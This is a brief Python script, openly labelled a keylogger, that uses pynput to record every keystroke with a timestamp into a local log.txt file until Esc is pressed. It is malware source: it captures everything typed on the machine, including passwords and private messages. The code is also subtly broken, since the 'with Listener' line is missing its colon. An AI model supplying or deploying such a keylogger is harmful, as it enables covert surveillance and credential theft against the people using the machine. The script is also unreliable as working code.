import pynput
import pynput.keyboard as Keyboard
from pynput.keyboard import Key,Listener
import datetime

def on_press(key):
    time=str(datetime.datetime.now())
    file=open('log.txt','a+')
    keyLog='{1} -> {0} -Pressed\n'.format(key,time)
    file.write(keyLog)
    file.close()

def on_release(key):
    if key == Keyboard.Key.esc:
        print(f'[+] Keylogger stopped')
        return False # stop the listener
    
with Listener(on_press=on_press,on_release=on_release) as listener
   listener.join()
